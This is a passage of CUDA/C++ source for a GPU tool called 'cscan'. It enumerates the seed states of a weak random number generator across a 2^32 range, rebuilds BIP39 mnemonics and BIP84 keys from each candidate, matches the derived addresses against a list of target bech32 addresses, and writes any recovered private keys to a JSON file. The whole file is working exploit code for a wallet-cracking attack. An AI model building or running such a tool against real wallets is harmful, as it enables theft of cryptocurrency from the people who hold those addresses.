    for (int i = 0; i < 4; i++) data[dlen + i] = uchar(index >> (24 - 8 * i));
    dlen += 4;
    uchar I[64];
    hmacSha512(par.cc, 32, data, dlen, I);
    EKey c;
    for (int i = 0; i < 32; i++) { c.key[i] = par.key[i]; c.cc[i] = I[32 + i]; }
    uchar il[32];
    for (int i = 0; i < 32; i++) il[i] = I[i];
    scalarAddModN(c.key, il);
    return c;
}

__device__ inline bool targetHit(const uchar *targets, uint count, const uchar h[20]) {
    uint lo = 0, hi = count;
    while (lo < hi) {
        uint mid = (lo + hi) >> 1;
        const uchar *t = targets + mid * 20;
        int cmp = 0;
        for (int i = 0; i < 20; i++) {
            if (h[i] < t[i]) { cmp = -1; break; }
            if (h[i] > t[i]) { cmp = 1; break; }
        }
        if (cmp == 0) return true;
        if (cmp < 0) hi = mid; else lo = mid + 1;
    }
    return false;
}

struct Params { ulong padStart; uint skipMax, idxMax, targetCount, rtcTR, rtcSSR, skipBase; };
struct Hit { uint pad, skip, idx; uchar priv[32]; uchar h160[20]; };

// one-time G doublings table (thread 0)
__global__ void setupG(Pt *table) {
    if (threadIdx.x != 0 || blockIdx.x != 0) return;
    Pt g = gPoint();
    for (int j = 0; j < 256; j++) {
        Pt a = g;
        if (j > 0) {
            Fe zinv, z2;
            feInv(zinv, a.z);
            feSqr(z2, zinv);
            feMul(a.x, a.x, z2);
            feMul(a.y, a.y, z2);
            feMul(a.y, a.y, zinv);
            for (int i = 0; i < 8; i++) a.z.l[i] = 0;
            a.z.l[0] = 1;
        }
        table[j] = a;
        ptDbl(g);
    }
}

// debug: print every chain stage for one known candidate
__global__ void debugCandidate(uint pad, uint skip, uint rtcTR, uint rtcSSR,
                               const uchar *words8, const Pt *gtab) {
    uint raw[8];
    bool ok = rngRawHP(pad, rtcTR, rtcSSR, (int)skip, raw);
    printf("ok=%d rawB=", (int)ok);
    uchar rawB[32];
    for (int i = 0; i < 8; i++) {
        rawB[i*4+0] = uchar(raw[i]);
        rawB[i*4+1] = uchar(raw[i] >> 8);
        rawB[i*4+2] = uchar(raw[i] >> 16);
        rawB[i*4+3] = uchar(raw[i] >> 24);
    }
    for (int i = 0; i < 32; i++) printf("%02x", rawB[i]);
    uchar ent[32];
    sha256once(rawB, 32, ent);
    printf("\nent=");
    for (int i = 0; i < 32; i++) printf("%02x", ent[i]);
    uchar sentence[256]; uint slen;
    entropyToSentence(ent, words8, sentence, slen);
    printf("\nslen=%u sent16=", slen);
    for (int i = 0; i < 16; i++) printf("%02x", sentence[i]);
    uchar seed[64];
    pbkdf2Bip39(sentence, slen, seed);
    printf("\nseed16=");
    for (int i = 0; i < 16; i++) printf("%02x", seed[i]);
    EKey acct = ckdPriv(ckdPriv(ckdPriv(masterFromSeed(seed), 84u|0x80000000u, gtab), 0u|0x80000000u, gtab), 0u|0x80000000u, gtab);
    {
        EKey ms = masterFromSeed(seed);
        printf("\nmaster=");
        for (int i = 0; i < 32; i++) printf("%02x", ms.key[i]);
        printf("\nmaster_cc=");
        for (int i = 0; i < 32; i++) printf("%02x", ms.cc[i]);
    }
    printf("\nacct=");
    for (int i = 0; i < 32; i++) printf("%02x", acct.key[i]);
    EKey ext  = ckdPriv(acct, 0u, gtab);
    printf("\next =");
    for (int i = 0; i < 32; i++) printf("%02x", ext.key[i]);
    EKey leaf = ckdPriv(ext, 0u, gtab);
    printf("\nleaf=");
    for (int i = 0; i < 32; i++) printf("%02x", leaf.key[i]);
    Pt pub; mulGTable(pub, leaf.key, gtab);
    uchar ser[33]; ptSerialize(pub, ser);
    uchar h[20]; hash160(ser, 33, h);
    printf("\nh160=");
    for (int i = 0; i < 20; i++) printf("%02x", h[i]);
    printf("\n");
}

// one thread = one (pad, skip) candidate
__global__ void scanKernel(const uchar *targets, const uchar *words8,
                           Hit *hits, uint *hitCnt, Params P, const Pt *gtab) {
    ulong gid = ulong(blockIdx.x) * blockDim.x + threadIdx.x;
    uint pad  = uint(P.padStart) + uint(gid / P.skipMax);
    uint skip = P.skipBase + uint(gid % P.skipMax);

    uint raw[8];
    if (!rngRawHP(pad, P.rtcTR, P.rtcSSR, int(skip), raw)) return;

    uchar rawB[32];
    for (int i = 0; i < 8; i++) {
        rawB[i*4+0] = uchar(raw[i]);
        rawB[i*4+1] = uchar(raw[i] >> 8);
        rawB[i*4+2] = uchar(raw[i] >> 16);
        rawB[i*4+3] = uchar(raw[i] >> 24);
    }
    uchar ent[32];
    sha256once(rawB, 32, ent);

    uchar sentence[256]; uint slen;
    entropyToSentence(ent, words8, sentence, slen);

    uchar seed[64];
    pbkdf2Bip39(sentence, slen, seed);

    EKey acct = ckdPriv(ckdPriv(ckdPriv(masterFromSeed(seed), 84u|0x80000000u, gtab), 0u|0x80000000u, gtab), 0u|0x80000000u, gtab);
    EKey ext  = ckdPriv(acct, 0u, gtab);

    for (uint idx = 0; idx < P.idxMax; idx++) {
        EKey leaf = ckdPriv(ext, idx, gtab);
        Pt pub; mulGTable(pub, leaf.key, gtab);
        uchar ser[33]; ptSerialize(pub, ser);
        uchar h[20]; hash160(ser, 33, h);
        if (P.padStart == 3547156718UL && gid == 4003UL && idx == 0) {
            printf("DBG pad=%u skip=%u rtc=%u/%u h=", pad, skip, P.rtcTR, P.rtcSSR);
            for (int j = 0; j < 20; j++) printf("%02x", h[j]);
            printf("\n");
        }
        if (targetHit(targets, P.targetCount, h)) {
            uint slot = atomicAdd(hitCnt, 1u);
            if (slot < 1024u) {
                hits[slot].pad = pad;
                hits[slot].skip = skip;
                hits[slot].idx = idx;
                for (int i = 0; i < 32; i++) hits[slot].priv[i] = leaf.key[i];
                for (int i = 0; i < 20; i++) hits[slot].h160[i] = h[i];
            }
        }
    }
}

// ---------------- host ----------------

static const char *CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";

static int bech32Prog(const char *addr, uchar out[20]) {
    const char *sep = strrchr(addr, '1');
    if (!sep || sep == addr) return -1;
    int vals[64], n = 0;
    for (const char *p = sep + 1; *p && n < 64; p++) {
        const char *c = strchr(CHARSET, *p);
        if (!c) return -1;
        vals[n++] = (int)(c - CHARSET);
    }
    if (n < 7 || vals[0] != 0) return -1;
    int acc = 0, bits = 0, olen = 0;
    for (int i = 1; i < n - 6; i++) {
        acc = (acc << 5) | vals[i];
        bits += 5;
        if (bits >= 8) { bits -= 8; if (olen >= 20) return -1; out[olen++] = (acc >> bits) & 0xFF; }
    }
    return olen == 20 ? 0 : -1;
}

static std::string readFile(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) { fprintf(stderr, "cannot open %s\n", path); exit(1); }
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    std::string s(sz, 0);
    fread(&s[0], 1, sz, f); fclose(f);
    return s;
}

static double nowSec() {
    struct timespec t; clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec + 1e-9 * t.tv_nsec;
}

int main(int argc, char **argv) {
    const char *targetsF = nullptr, *wordsF = "bip39_english.txt", *outF = "hits_gpu.json";
    uint rtcTR = 0, rtcSSR = 0, skipMax = 8, idxMax = 16, skipBase = 0;
    ulong padStart = 0, padEnd = 1ULL << 32, batchThreads = 1u << 22;
    ulong debugPad = 0;
    int opt;
    while ((opt = getopt(argc, argv, "t:w:r:s:k:i:p:b:o:D:B:e:")) != -1) {
        switch (opt) {
        case 'D': debugPad = strtoull(optarg, NULL, 0); break;
        case 'B': skipBase = (uint)strtoul(optarg, NULL, 0); break;
        case 'e': padEnd = strtoull(optarg, NULL, 0); break;
        case 't': targetsF = optarg; break;
        case 'w': wordsF = optarg; break;
        case 'r': rtcTR = (uint)strtoul(optarg, NULL, 0); break;
        case 's': rtcSSR = (uint)strtoul(optarg, NULL, 0); break;
        case 'k': skipMax = (uint)strtoul(optarg, NULL, 0); break;
        case 'i': idxMax = (uint)strtoul(optarg, NULL, 0); break;
        case 'p': padStart = strtoull(optarg, NULL, 0); break;
        case 'b': batchThreads = strtoull(optarg, NULL, 0); break;
        case 'o': outF = optarg; break;
        }
    }
    if (!targetsF) { fprintf(stderr, "-t targets.txt required\n"); return 2; }

    // targets -> sorted 20-byte progs
    std::vector<std::array<uchar, 20>> progs;
    {
        std::string ttext = readFile(targetsF);
        char *copy = strdup(ttext.c_str());
        for (char *line = strtok(copy, "\n"); line; line = strtok(NULL, "\n")) {
            if (strlen(line) < 10) continue;
            std::array<uchar, 20> p;
            if (bech32Prog(line, p.data()) != 0) { fprintf(stderr, "bad address: %s\n", line); return 2; }
            progs.push_back(p);
        }
        free(copy);
    }
    uint tcount = (uint)progs.size();
    std::sort(progs.begin(), progs.end());
    fprintf(stderr, "[cscan] %u targets loaded\n", tcount);

    // wordlist -> 2048 x 8 zero-padded
    std::vector<uchar> words8(2048 * 8, 0);
    {
        std::string wtext = readFile(wordsF);
        char *copy = strdup(wtext.c_str());
        uint wcount = 0;
        for (char *w = strtok(copy, "\n"); w && wcount < 2048; w = strtok(NULL, "\n")) {
            size_t l = strlen(w);
            if (l > 8) { fprintf(stderr, "word too long: %s\n", w); return 2; }
            memcpy(words8.data() + 8 * wcount, w, l);
            wcount++;
        }
        free(copy);
        if (wcount != 2048) { fprintf(stderr, "wordlist %u != 2048\n", wcount); return 2; }
    }

    uchar *dTargets, *dWords; Hit *dHits; uint *dCnt; Pt *dG;
    CUDA_CHECK(cudaMalloc(&dTargets, progs.size() * 20));
    CUDA_CHECK(cudaMalloc(&dWords, words8.size()));
    CUDA_CHECK(cudaMalloc(&dHits, 1024 * sizeof(Hit)));
    CUDA_CHECK(cudaMalloc(&dCnt, 4));
    CUDA_CHECK(cudaMalloc(&dG, 256 * sizeof(Pt)));
    CUDA_CHECK(cudaMemcpy(dTargets, progs.data(), progs.size() * 20, cudaMemcpyHostToDevice));
    CUDA_CHECK(cudaMemcpy(dWords, words8.data(), words8.size(), cudaMemcpyHostToDevice));

    setupG<<<1, 1>>>(dG);
    CUDA_CHECK(cudaDeviceSynchronize());

    if (debugPad) {
        debugCandidate<<<1, 1>>>((uint)debugPad, skipMax, rtcTR, rtcSSR, dWords, dG);
        CUDA_CHECK(cudaDeviceSynchronize());
        return 0;
    }

    fprintf(stderr, "[cscan] G table ready\n");

    ulong batchPads = batchThreads / skipMax;
    if (!batchPads) batchPads = 1;
    fprintf(stderr, "[cscan] rtc=%u/%u skipMax=%u idxMax=%u batch=%llu pads (%llu threads)\n",
            rtcTR, rtcSSR, skipMax, idxMax, batchPads, batchPads * skipMax);

    double t0 = nowSec(), elapsed0 = 0;
    ulong done = 0;
    for (ulong base = padStart; base < padEnd; base += batchPads) {
        Params P = { base, skipMax, idxMax, tcount, rtcTR, rtcSSR, skipBase };
        CUDA_CHECK(cudaMemset(dCnt, 0, 4));
        ulong threads = batchPads * skipMax;
        uint block = 256;
        ulong grid = (threads + block - 1) / block;
        scanKernel<<<grid, block>>>(dTargets, dWords, dHits, dCnt, P, dG);
        CUDA_CHECK(cudaDeviceSynchronize());
        uint hits;
        CUDA_CHECK(cudaMemcpy(&hits, dCnt, 4, cudaMemcpyDeviceToHost));
        double dt = nowSec() - t0;
        double batchDt = dt - elapsed0; elapsed0 = dt;
        done += batchPads;
        double rate = done / dt;
        double remain = ((double)padEnd - padStart) - done;
        fprintf(stderr, "[cscan] pad~%llu  %.2f Mpads/s  batch %.1fs  eta %.1fh\n",
                base + batchPads, rate / 1e6, batchDt, remain / rate / 3600);
        if (hits) {
            uint n = hits < 1024 ? hits : 1024;
            std::vector<Hit> H(n);
            CUDA_CHECK(cudaMemcpy(H.data(), dHits, n * sizeof(Hit), cudaMemcpyDeviceToHost));
            FILE *o = fopen(outF, "w");
            fprintf(o, "[\n");
            for (uint i = 0; i < n; i++) {
                fprintf(stderr, "[HIT] pad=%u skip=%u idx=%u priv=", H[i].pad, H[i].skip, H[i].idx);
                for (int j = 0; j < 32; j++) fprintf(stderr, "%02x", H[i].priv[j]);
                fprintf(stderr, " h160=");
                for (int j = 0; j < 20; j++) fprintf(stderr, "%02x", H[i].h160[j]);
                fprintf(stderr, "\n");
                fprintf(o, " {\"pad\": %u, \"skip\": %u, \"idx\": %u, \"priv\": \"", H[i].pad, H[i].skip, H[i].idx);
                for (int j = 0; j < 32; j++) fprintf(o, "%02x", H[i].priv[j]);
                fprintf(o, "\", \"h160\": \"");
                for (int j = 0; j < 20; j++) fprintf(o, "%02x", H[i].h160[j]);
                fprintf(o, "\"}%s\n", i + 1 < n ? "," : "");
            }
            fprintf(o, "]\n");
            fclose(o);
            fprintf(stderr, "[cscan] %u hit(s) -> %s\n", hits, outF);
            return 0;
        }
    }
    fprintf(stderr, "[cscan] exhausted 2^32 x %u skip, no hit\n", skipMax);
    return 1;
}
